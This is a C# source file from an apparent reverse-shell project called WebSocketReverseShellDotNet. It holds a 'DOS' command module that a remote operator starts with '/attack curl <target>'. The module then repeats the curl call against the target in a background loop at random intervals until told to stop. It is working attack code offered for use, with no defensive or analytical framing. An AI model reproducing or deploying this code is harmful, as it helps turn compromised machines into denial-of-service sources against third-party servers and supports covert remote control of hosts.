using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;
using static Org.BouncyCastle.Asn1.Cmp.Challenge;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class DOS : Command
    {

        private static bool running = false;
        private static StringBuilder output = new StringBuilder();

        public string ExecuteCommand(string command)
        {
            output.Clear();
            List<string> commands = new List<string>(DataManuplationUtil.StringToList(command, " "));
            if (commands[0].Equals("/attack", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);
                RunDOS(commands);
            }
            else
            {
                output.Append("Command is invalid /??");
            }


            return output.ToString();
        }

        private static void RunDOS(List<string> commands)
        {
            string fullCommand = String.Join(" ", commands);
            if (commands.Count == 0)
            {
                output.Append($"invalid command {fullCommand}");
                return;
            }



            if (commands[0].Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                if (DOS.running)
                {
                    DOS.running = false;
                    output.Append("Stopping DOS");
                    return;
                }
                else
                {
                    output.Append("DOS is not running. You can't stop a process if its not running. " +
                    "To run use '/attack curl <rest of the command>'");
                    return;
                }
            }  else if (DOS.running)
            {
                output.Append("DOS is already running. Stop by /attack stop");
                return;
            } else if (commands[0].Equals("curl", StringComparison.OrdinalIgnoreCase))
            { 
                int callPerMilliSeconds = 7000;

                output.Append($"Starting DOS. Observe the below output per call every {callPerMilliSeconds}");
                output.Append(SystemCommandUtil.RunCommand(fullCommand));
                OSUtil.RunInSeparateThread(() => StartDOS(fullCommand, callPerMilliSeconds));

                return;

            }else
            {
                output.Append($"invalid command {fullCommand}");
                return;
            }

        }

        private static async Task StartDOS(String command, int milliseconds)
        {
            DOS.running = true;
            Random random = new Random();
            while (DOS.running)
            {
                SystemCommandUtil.RunCommand(command);

                Thread.Sleep(random.Next(0, milliseconds));


            }

          
        }


    }
}
